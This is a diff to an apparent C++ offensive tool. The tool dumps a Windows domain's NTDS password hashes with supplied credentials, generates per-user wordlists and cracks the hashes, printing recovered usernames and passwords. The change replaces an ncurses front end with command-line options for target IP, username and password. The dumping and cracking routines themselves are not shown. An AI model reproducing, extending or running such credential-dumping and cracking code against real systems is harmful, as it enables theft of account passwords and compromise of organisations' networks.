@@ -6,9 +6,9 @@
 #include <cstdlib>
 #include <unordered_map>
 #include <regex>
-#include <ncurses.h>
 #include <cstring>
 #include <cstring>
+#include <CLI/CLI.hpp>
 using namespace std;
 
 class Cracker {
@@ -102,23 +102,31 @@ class Cracker {
             return creds;
         }
 
-        std::vector<string> launch() {
+        void launch() {
+            std::cout << "[*] Dumping hashes..." << std::endl;
             std::string output = get_ntds();
+            if (output.length() > 0) {
+                std::cout << "[+] Hashes dumped!" << std::endl;
+            } else {
+                return;
+            }
+            std::cout << "[*] Parsing dumped hashes..." << std::endl;
             std::unordered_map<std::string, std::string> creds = parse_hashes(output);
             std::vector<string> resp;
             std::pair<bool, string> crack_status;
             for (const auto& kv : creds) {
+                std::cout << "[*] The password of '" << 
+                kv.first << "' is cracking..." << std::endl;
                 crack_status = std::make_pair(false, "");
                 std::vector<string> wl = generate(kv.first);
                 crack_status = crack(wl, kv.second.c_str());
                 if (crack_status.first) {
-                    resp.push_back("Username: " +
-                        kv.first +
-                        " & Password: " +
-                        crack_status.second);
+                    std::cout << "[+] Cracked: " <<
+                        "['" << kv.first << "':" <<
+                        "'" << crack_status.second << "']" <<
+                        std::endl;
                 }
             }
-            return resp;
         }
 
     private:
@@ -165,66 +173,31 @@ class Cracker {
     }
 };
 
-int main() {
-    // initialize ncurses
-    initscr();
-    cbreak();
-    keypad(stdscr, TRUE);
-
-    // set up colors
-    start_color();
-    init_pair(1, COLOR_CYAN, COLOR_BLACK);
-    init_pair(2, COLOR_MAGENTA, COLOR_BLACK);
-    init_pair(3, COLOR_YELLOW, COLOR_BLACK);
-    init_pair(4, COLOR_GREEN, COLOR_BLACK);
-    init_pair(5, COLOR_RED, COLOR_BLACK);
-    attron(COLOR_PAIR(1));
-
+int main(int argc, char** argv) {
     // draw banner
     const char* banner_text = "    _   __________               __           \n"
                      "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                      "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                      " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                      "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
+    cout << banner_text << endl;
 
-    int y = LINES / 2 - 6;
-    printw(banner_text);
-    move(y + 6, 0);
-    refresh();
+    CLI::App app{"MyApp"};
 
-    // get target value from user input
-    mvprintw(LINES / 2 + 2, COLS / 2 - 12, "Enter target: ");
-    echo();
-    char target[100];
-    getstr(target);
-    noecho();
-    clear();
-    target[strcspn(target, "\n")] = 0;
+    std::string ip_address, username, password;
 
-    // display user's input
-    printw(banner_text);
-    refresh();
+    app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
+    app.add_option("-u,--username", username, "Username")->required();
+    app.add_option("-p,--password", password, "Password")->required();
 
-    // use target value
+    CLI11_PARSE(app, argc, argv);
+
+    std::string target = username + ":" + password + "@" + ip_address;
+
+    // Use the target value
     Cracker C;
     C.target = target;
-    std::vector<string> response = C.launch();
-    int response_y = LINES / 2 + 2;
-    int response_x = 2; // starting position of the table
+    C.launch();
 
-    // print table headers
-    attron(COLOR_PAIR(4));
-    mvprintw(response_y, response_x, "%-10s %-20s", "Status", "Response");
-    response_y++;
-
-    for (const auto& resp : response) {
-        attron(COLOR_PAIR(5));
-        mvprintw(response_y, response_x, "%-10s %-20s", "Cracked", resp.c_str());
-        response_y++;
-    }
-    refresh();
-    getch();
-    // clean up ncurses and exit
-    endwin();
     return 0;
 }
